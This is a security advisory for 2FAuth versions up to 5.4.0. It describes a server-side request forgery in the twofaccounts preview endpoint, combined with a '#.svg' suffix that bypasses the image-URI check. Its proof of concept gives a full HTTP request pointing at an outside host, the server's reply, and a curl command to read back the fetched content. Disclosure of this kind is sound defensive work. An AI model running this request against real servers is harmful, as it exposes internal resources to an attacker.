# SSRF + URI validation bypass in 2fauth /api/v1/twofaccounts/preview

High

## Package

2FAuth

## Affected versions

v5.4.0 and below

## Patched versions

v5.4.1

## Description

## Details

There is two vulnerabilities discovered, a SSRF and URI validation bypass issue in 2fauth.

The endpoint at POST /api/v1/twofaccounts/preview allows setting a remote URI to retrieve the image of a 2fa site. By abusing this functionality, it is possible to force the application to make a GET request to an arbitrary URL, whose content will be stored in an image file in the server if it looks like an image.

Additionally, the library does some basic validation on the URI, attempting to filter our URIs which do not have an image extension. However, this can be easily bypassed by appending the string #.svg to the URI.

The combination of these two issues allows an attacker to retrieve URIs accessible from the application, as long as their content type is text based. If not, the request is still sent, but the response is not reflected to the attacker.

## PoC

* Log in to the application.
* Send a request to the preview endpoint, like the following:

```
POST /api/v1/twofaccounts/preview HTTP/2
Host: demo.2fauth.app
Cookie: <valid cookie>
X-Xsrf-Token: <valid xsrf token>
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 135

{
     "uri":
"otpauth://totp/Test:test@example.com?secret=JBSWY3DPEHPK3PXP&image=http://yyy.n.pwn.band/response/hex/4142%23.svg"
}

```

* Get the stored file from the response:

```
HTTP/2 200 OK
Content-Type: application/json
Server: Apache
X-Powered-By: PHP/8.2
Cache-Control: no-cache, private
X-Ratelimit-Limit: 60
X-Ratelimit-Remaining: 55
Access-Control-Allow-Origin: *

{"otp_type":"totp","account":"test@example.com","service":"Test","icon":"TY8g5ljvfzGvi3WXEuC2rTFrfjDa9KiG4O6tSmpW.svg","secret":"JBSWY3DPEHPK3PXP","digits":6,"algorithm":"sha1","period":30,"counter":null}

```

* Access the stored file and retrieve the URI's content:

```
$ curl https://demo.2fauth.app/storage/icons/TY8g5ljvfzGvi3WXEuC2rTFrfjDa9KiG4O6tSmpW.svg

```

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
